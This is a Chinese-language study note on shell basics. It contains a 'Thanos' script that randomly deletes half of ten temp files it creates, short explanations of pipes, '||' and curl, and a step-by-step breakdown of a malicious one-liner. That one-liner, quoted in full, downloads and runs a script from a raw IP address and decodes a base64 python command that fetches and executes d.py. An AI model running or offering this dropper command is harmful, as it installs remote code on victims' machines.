Thanos.sh
```python
#!/bin/sh
#filename 为本shell的文件名，例如这里是Thanos.sh
filename=${0##*/}
rm_dir="./temp"
# 在当前目录下创建一个temp文件夹，并在temp文件夹下创建10个文件（1.txt，2.txt。。。）
function touch_file()
{
    if [[ ! -d ${rm_dir} ]]; then
        mkdir -p ${rm_dir}
    fi

    cnt=10
    while [[ cnt -gt 0 ]];
    do
        touch ${rm_dir}/${cnt}.txt
        let cnt-=1
    done
}

function rm_files()
{
    #shuf是linux产生随机序列命令，gshuf大致也差不多一个意思
    sf="shuf"
    if [[ "`uname`" == "Darwin" ]]; then
        sf="gshuf"
    fi
    #让files获取所有文件名（除了自身）
    files=()
    while read line;
    do
        files+=("${line}")
    done <<< "`find ${rm_dir} -not -name "${filename}" -type f`"
    #nums为删除文件的数量
    let nums=${#files[*]}/2
    #删除一半文件
    echo ${files[*]} | xargs printf "%s\0" | ${sf} -z -n ${nums} | awk "{print \"xargs -0 -- sudo rm -f \" \$0}"
    echo "nums: ${nums}"
}

touch_file
rm_files

# Explanation
## Step 1: Get the count of files in current path divided by two.
## Step 2: Get all the files in current path and print in one line.
## Step 3: Turn half of the second step output into standard input randomly.
```

##### ｜管道符号

[https://blog.51cto.com/litaotao/1187983](https://blog.51cto.com/litaotao/1187983)

用法：命令1 | 命令2
机制：上一个的命令输出作为下一个命令的输入

```
ls -a | grep bash
```

.bash_history
.bash_logout
.bash_profile
.bashrc
grep用来从一个文件中找出匹配指定关键字的那一行，并送到标准输出,结合管道，我们
通常用它来过滤搜索结果.

##### || 逻辑或

       用法：命令1 || 命令2
       机制：如果命令1执行成功，不执行命令2；否则，
           才执行命令2

#### curl

[https://www.ruanyifeng.com/blog/2019/09/curl-reference.html](https://www.ruanyifeng.com/blog/2019/09/curl-reference.html)

是常用的命令行工具，用来请求 Web 服务器。它的名字就是客户端（client）的 URL 工具的意思

```bash
curl https://www.example.com
```

上面命令向`www.example.com`发出 GET 请求，服务器返回的内容会在命令行输出。

`-s`参数将不输出错误和进度信息。

```bash
$ curl -s https://www.example.com
```

#### 一个恶意命令解析

```
/bin/bash -c (curl -s http://80.71.158.96/xms || wget -q -O - http://80.71.158.96/xms || lwp-download http://80.71.158.96/xms /tmp/xms) | bash -sh; bash /tmp/xms; rm -rf /tmp/xms; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly84MC43MS4xNTguOTYvZC5weSIpLnJlYWQoKSkn | base64 -d | bash -
```

/bin/bash -c 后面加命令

curl -s [http://80.71.158.96/xms](http://80.71.158.96/xms) || wget -q -O - [http://80.71.158.96/xms](http://80.71.158.96/xms) || lwp-download [http://80.71.158.96/xms](http://80.71.158.96/xms) /tmp/xms

；是指可以拼接命令

bash /tmp/xms 执行下载的脚本

rm -rf /tmp/xms 删除文件

echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly84MC43MS4xNTguOTYvZC5weSIpLnJlYWQoKSkn | base64 -d | bash -

解密这个使用base64编码的命令
![image.png](https://cdn.nlark.com/yuque/0/2022/png/2652737/1656506996614-73ab770a-6902-4951-b1f9-b637986699ef.png?x-oss-process=image%2Fresize%2Cw_750%2Climit_0)
实际上是下载了d.py这个文件并读取执行
![image.png](https://cdn.nlark.com/yuque/0/2022/png/2652737/1656507017442-9809cfef-5a47-4cfc-a14a-52ec0fbe68cb.png?x-oss-process=image%2Fresize%2Cw_750%2Climit_0)
整个命令内容就是：

下载并执行xms脚本

下载并执行d.py
